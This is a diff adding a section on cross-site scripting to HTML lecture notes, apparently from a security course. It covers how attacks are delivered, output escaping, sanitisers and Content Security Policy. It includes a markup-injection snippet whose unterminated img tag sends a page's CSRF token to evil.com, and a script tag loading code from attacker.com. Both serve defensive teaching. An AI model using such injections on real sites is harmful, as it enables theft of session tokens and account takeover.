@@ -145,6 +145,211 @@ Trick the user to give their password by showing fake login
 Mine bitcoins 
 
 </ul>
+  
+<div id="Tenth lecture - Cross-site scripting-Cross-site scripting-Vector"><h3 id="Vector" class="header"><a href="#Tenth lecture - Cross-site scripting-Cross-site scripting-Vector">Vector</a></h3></div>
+<p>
+How does the attacker inject script?
+</p>
+<ul>
+<li>
+User sata from one user visible to another (Ex: Samy)
+
+<li>
+URL variables (There is an example in "Secure and resilient software developmen)
+
+<li>
+User data from post requests
+
+<li>
+Evaluating user data in client side script
+
+</ul>
+
+<div id="Tenth lecture - Cross-site scripting-Cross-site scripting-XML HttpRequest"><h3 id="XML HttpRequest" class="header"><a href="#Tenth lecture - Cross-site scripting-Cross-site scripting-XML HttpRequest">XML HttpRequest</a></h3></div>
+<p>
+Scripts can make HTTP requests to the current origin.
+This means that once an attacker has injected a script, he can do anything the user could do:
+</p>
+<ul>
+<li>
+GET pages
+
+<li>
+POST forms
+
+<li>
+etc...
+
+<li>
+<span id="Tenth lecture - Cross-site scripting-Cross-site scripting-XML HttpRequest-Example"></span><strong id="Example">Example</strong>: The Samy work used POST requests to update the profile, and add the user samy as friend.
+
+</ul>
+
+<div id="Tenth lecture - Cross-site scripting-XSS prevention strategies"><h2 id="XSS prevention strategies" class="header"><a href="#Tenth lecture - Cross-site scripting-XSS prevention strategies">XSS prevention strategies</a></h2></div>
+
+<div id="Tenth lecture - Cross-site scripting-XSS prevention strategies-Filtering input (not sufficient)"><h3 id="Filtering input (not sufficient)" class="header"><a href="#Tenth lecture - Cross-site scripting-XSS prevention strategies-Filtering input (not sufficient)">Filtering input (not sufficient)</a></h3></div>
+<p>
+In general , trying to preent maliious input is difficult:
+</p>
+<ul>
+<li>
+Blacklisting is bad security practice
+
+<li>
+The disallowed characters (say, &amp;, &lt;, &gt;, ", ' and /) are quite common
+
+<li>
+Client side checking is easy to circumvent
+
+</ul>
+<p>
+Can work for simple things like: usernames or email addresses.
+</p>
+
+<div id="Tenth lecture - Cross-site scripting-XSS prevention strategies-Escaping output"><h3 id="Escaping output" class="header"><a href="#Tenth lecture - Cross-site scripting-XSS prevention strategies-Escaping output">Escaping output</a></h3></div>
+<p>
+How to escape data inserted into HTML depends on the context.
+These situations must be handled differently:
+</p>
+<ul>
+<li>
+HTML body <div>DATA</div>
+
+<li>
+Quoted attributes <div id="DATA"></div>
+
+<li>
+Unquoted attributes <div id=DATA></div>
+
+<li>
+Quotes strings in JS: alert('DATA)
+
+<li>
+CSS attribute values background-color: DATA;
+
+<li>
+JSON data
+
+<li>
+etc...
+
+</ul>
+<p>
+Implementing the escaping is error-prone.
+<span id="Tenth lecture - Cross-site scripting-XSS prevention strategies-Escaping output-Do not implement this yourself."></span><strong id="Do not implement this yourself.">Do not implement this yourself.</strong> Use a library, such as OWASP Java Encoder.
+<hr />
+For a string placed inside an HTML element (ex: <div>DATA</div>), we can do the following substitution:
+</p>
+<ul>
+<li>
+&amp; -&gt; &amp;amp;
+
+<li>
+&lt; -&gt; &amp;lt;
+
+<li>
+&gt; -&gt; &amp;gt;
+
+<li>
+" -&gt; &amp;quot;
+
+<li>
+' -&gt; &amp;#x27;
+
+<li>
+/ -&gt; &amp;#x2F;
+
+</ul>
+<p>
+Use your web-framework's well-tested implementation for this.
+</p>
+
+<div id="Tenth lecture - Cross-site scripting-XSS prevention strategies-The dont's"><h3 id="The dont's" class="header"><a href="#Tenth lecture - Cross-site scripting-XSS prevention strategies-The dont's">The dont's</a></h3></div>
+<p>
+There are a number of places where one should just avoid inserting untrusted data.
+</p>
+<ul>
+<li>
+Avoid inserting untrusted data in:
+
+<ul>
+<li>
+tag names
+
+<li>
+attribute names
+
+<li>
+scripts
+
+<li>
+directly in CSS
+
+</ul>
+</ul>
+
+<div id="Tenth lecture - Cross-site scripting-XSS prevention strategies-Text formatting"><h3 id="Text formatting" class="header"><a href="#Tenth lecture - Cross-site scripting-XSS prevention strategies-Text formatting">Text formatting</a></h3></div>
+<p>
+<span id="Tenth lecture - Cross-site scripting-XSS prevention strategies-Text formatting-Problem:"></span><strong id="Problem:">Problem:</strong> We want to let the user format their input, but worry about letting them use HTML because of XSS.
+<span id="Tenth lecture - Cross-site scripting-XSS prevention strategies-Text formatting-Solutions:"></span><strong id="Solutions:">Solutions:</strong>
+</p>
+<ul>
+<li>
+HTML sanitisers (Ex: OWASP AntiSamy project)
+
+<li>
+Using another markup language (Markdown, BBCode) with safe conversion to HTML
+
+<ul>
+<li>
+Markdown allows literal HTML, which must be sanitised
+
+<li>
+Many BBCode implementations do nothing to prevent XSS
+
+</ul>
+</ul>
+<p>
+Notice: Even graphical formatting tools must represent the formatting in some way, and can be just as vulnerable to XSS as code-based ones.
+</p>
+
+<div id="Tenth lecture - Cross-site scripting-Markup injection"><h2 id="Markup injection" class="header"><a href="#Tenth lecture - Cross-site scripting-Markup injection">Markup injection</a></h2></div>
+<p>
+An attaker does not always need to inject JavaScript:
+</p>
+<pre>
+&lt;img src='http://evil.com/log.cgi?	&lt;- Injected line with a non-terminated parameter
+...
+&lt;input type="hidden" name="xsrf_token" value="12345"&gt;
+...
+'									&lt;- Normally-occuring apostrophe in page text
+...
+&lt;/div&gt;								&lt;- Any normally-occuring tag (to provide a closing bracket
+</pre>
+<p>
+Reference: Letters from a post-XXS world.
+</p>
+
+<div id="Tenth lecture - Cross-site scripting-Content Security Policy"><h2 id="Content Security Policy" class="header"><a href="#Tenth lecture - Cross-site scripting-Content Security Policy">Content Security Policy</a></h2></div>
+<p>
+CSP is a way to further harden the website against cross-site scripting.
+Policies set in the <span id="Tenth lecture - Cross-site scripting-Content Security Policy-HTTP header"></span><strong id="HTTP header">HTTP header</strong>:
+</p>
+<ul>
+<li>
+Control which sources content (scripts, images, css, ...) are allowed come from
+
+<li>
+Violations are reported back to the server.
+
+</ul>
+
+<div id="Tenth lecture - Cross-site scripting-Content Security Policy-Examples"><h3 id="Examples" class="header"><a href="#Tenth lecture - Cross-site scripting-Content Security Policy-Examples">Examples</a></h3></div>
+<p>
+Only allow content from same site: <em>Content-Security-Policy "default-src 'self';"</em>
+Example violation: _&lt;script src="<a href="https://attacker.com/exploit&quot;&gt;&lt;/script&gt;_">https://attacker.com/exploit"&gt;&lt;/script&gt;_</a>
+<hr />
+</p>
 
 </body>
 </html>
